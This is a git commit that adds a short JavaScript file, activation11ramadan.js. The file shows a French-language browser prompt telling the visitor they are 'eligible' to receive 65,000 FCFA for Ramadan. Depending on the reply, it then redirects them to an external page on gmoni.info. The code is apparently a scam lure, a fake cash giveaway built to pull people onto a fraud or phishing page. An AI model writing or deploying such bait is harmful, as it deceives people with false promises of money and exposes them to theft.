25b59cbd8fda40a164f632b71b8799b1b2d6d7d5
help0z <triplerain29@gmail.com>
2026-02-23 01:15:16 +0100

    Create activation11ramadan.js

---
+++ activation11ramadan.js
@@ -0,0 +1,9 @@
+  
+var password = 'RETRAIT D ARGENT'
+password = prompt(
+  'Félicitations! Vous êtes éligible à recevoir 65 000 FCFA. Veuillez appuyer sur OK pour l obtenir maintenant.',
+  'RETRAIT D ARGENT'
+);
+if (password != 'RETRAIT D ARGENT') {
+  location.href = 'https://gmoni.info/65000-FCFA-Mahamat-Ramadan.html';
+}
